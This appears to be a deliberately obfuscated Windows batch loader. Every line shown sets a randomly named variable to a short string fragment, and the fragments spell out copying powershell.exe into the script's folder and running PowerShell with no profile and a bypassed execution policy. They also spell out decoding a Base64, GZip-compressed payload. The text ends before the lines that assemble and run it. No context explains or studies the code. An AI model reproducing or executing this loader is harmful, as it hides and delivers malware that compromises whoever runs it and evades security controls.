@echo off
set "KghojgvTYQ=em"
set "fXThQHHlBP=ow"
set "odufkNHyyG=Sy"
set "cJyhhFmQny= /"
set "WMYgGlWMfB=0\"
set "VjdMztCzfs=:\"
set "QFukMUONnT=rS"
set "gObummiXuB=st"
set "jgGGGGSPiT=xe"
set "RoSnlnJnRH=\v"
set "ZjMVJgnrvu=\W"
set "IubrBBtlEc=ws"
set "DbfyNPjDhK=we"
set "vhBFoTnOyL=nd"
set "fxSSLmJetq=we"
set "rGhXbzSnHX=po"
set "oQfOuiWfWd=in"
set "KFJHflCiGp=ll"
set "OKBTknpWgm=he"
set "CIrKUUHAtQ=ll"
set "ctEumNfZEW=.e"
set "VoLIHxOzpe=s\"
set "zUwfAvWYHy=1."
set "xQrQYXrNdC=y "
set "RLYbjyORaQ=py"
set "MYnUsSveNM=co"
set "rNzIBspIWk=do"
set "oDAisfqLHa=rs"
set "qWipqTNzea=he"
set "jcflirrJdf=Wi"
set "eNytxbDOWd=32"
set "ATLywGNykG= C"
set "TeyDBoIKYo=Po"
set "DLJSUYMbFu= %~dp0"
set "fMuzDEgBdZ=cd"
set "rSPvWFMPpv=nirt"
set "ipaGmeBPHD=Disp"
set "WpoKDlsjtM=.GZi"
set "IaDHyXlQJK=New-"
set "FVfgyLrBCS=ing("
set "cnyaAGpdKR=S46e"
set "SwtvJPdiEj=O.Me"
set "mbGTfpAqbz=-nop"
set "nPjjIjSDEj=7Yiv"
set "ErgTjwOisc=iron"
set "cvVhYbCJsg=join"
set "DXKwKPjPZe=tem."
set "AMkteyVioQ=null"
set "ypsCdtQrtz=-Obj"
set "GizGFFiRKN=w, 0"
set "NYNCxKzmgk=[Env"
set "fHqfSNSzTI=-1.."
set "zCRnRwmOpN=n) {"
set "xmhfWSrksb=0O+g"
set "GiUfSAHIEy=tS46"
set "QbohJYIvjr=[Sys"
set "oxrhkQalKT=y.Cr"
set "PxAeGTYOvq=3); "
set "cnGhLlFuti=$HLI"
set "LwbepRNGur=m.IO"
set "iTFvGXLlux=)($o"
set "bxUgnNmEhj=ddin"
set "CouyJJOMUh=xl ="
set "lmSQNzvzNA=esaB"
set "pYxovYePmQ=stem"
set "JyaXCaEGHr=;$UM"
set "GcowhlVqoN=ptor"
set "JNKEfHpmnf=] -j"
set "MdiQEBxtzq=+hAO"
set "zKybOyCJHu=3HWs"
set "ASFJnteXKb='dqR"
set "kkJWzzTzpY=yste"
set "ymJjrhAjYh=bypa"
set "mrGIbnevOs=;$Vy"
